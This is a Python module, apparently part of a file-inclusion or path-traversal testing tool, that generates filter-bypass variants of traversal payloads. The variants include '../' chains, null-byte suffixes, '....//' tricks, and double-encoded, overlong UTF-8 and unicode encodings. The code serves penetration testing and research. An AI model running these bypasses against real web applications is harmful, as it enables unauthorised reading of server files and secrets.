LEVEL = 3
FILTERS_CACHE = None
MAX_DEPTH = 10


def set_level(e: int):
    global LEVEL
    global FILTERS_CACHE
    global MAX_DEPTH

    e = min(e, 3)
    e = max(1, e)

    if e != LEVEL:
        LEVEL = e

        if LEVEL == 1:
            MAX_DEPTH = 4
        elif LEVEL == 2:
            MAX_DEPTH = 7
        else:
            MAX_DEPTH = 10

        FILTERS_CACHE = None


"""
return list of all possible bypasses 
"""


def calc_filters():
    global LEVEL

    res = [FilterByPass()]

    for suffix in ["", "\0"]:  # null byte for < PHP 5.4

        res.append(FilterByPass(prefix="file://", suffix=suffix))

        # climb up directory tree
        for level in range(0, MAX_DEPTH):  # maximum depth
            res.append(FilterByPass(prefix="../" * level, suffix=suffix))

            res.append(FilterByPass(prefix="/" + "../" * level, suffix=suffix))  # if payload is part of filename

            # bypass traversal sequences removed non-recursively
            if LEVEL > 1:
                res.append(FilterByPass(replacers={"../": "....//"}, prefix="../" * level,
                                        suffix=suffix))
                res.append(FilterByPass(replacers={"/": "%2f"}, prefix="../" * level, suffix=suffix))

            if LEVEL == 3:
                res.append(FilterByPass(prefix=".././" * level, suffix=suffix))

                # double encode
                res.append(FilterByPass(replacers={"/": "%252f"}, prefix="../" * level, suffix=suffix))
                res.append(FilterByPass(replacers={"/": "%c0%af"}, prefix="../" * level, suffix=suffix))
                res.append(FilterByPass(replacers={"/": "%252f", ".": "%252e"}, prefix="../" * level, suffix=suffix))
                res.append(FilterByPass(replacers={"/": "%c0%af", ".": "%252e"}, prefix="../" * level, suffix=suffix))

                # unicode
                res.append(FilterByPass(replacers={"/": "%u2215"}, prefix="../" * level, suffix=suffix))
                res.append(FilterByPass(replacers={"/": "%u2215", ".": "%uff0e"}, prefix="../" * level, suffix=suffix))

    # res = [FilterByPass()]

    return res


def get_bypass_possibilities():
    global FILTERS_CACHE

    if FILTERS_CACHE is None:
        FILTERS_CACHE = calc_filters()

    return FILTERS_CACHE


class FilterByPass:
    found_bypass = False

    def __init__(self, replacers=None, prefix="", suffix=""):
        if replacers is None:
            replacers = {}
        self.replacers = replacers
        self.prefix = prefix
        self.suffix = suffix

    """
    call if current bypass worked
    """

    def adjust(self, path_to_include):

        path_to_include = self.prefix + path_to_include + self.suffix

        for (k, v) in self.replacers.items():
            path_to_include = path_to_include.replace(k, v)

        return path_to_include

    def describe_current_filter(self):

        res = ""

        if self.prefix:
            res = res + "Prefix: " + self.prefix.replace("\0", "%00") + "; "
        if self.suffix:
            res = res + "Suffix: " + self.suffix.replace("\0", "%00") + "; "

        for (k, v) in self.replacers.items():
            res = res + f"Replace '{k}' with '{v}'; "

        if res.endswith("; "):
            res = res[:-2]

        if not res:
            res = "None"

        return res

    def __str__(self):
        return self.describe_current_filter()
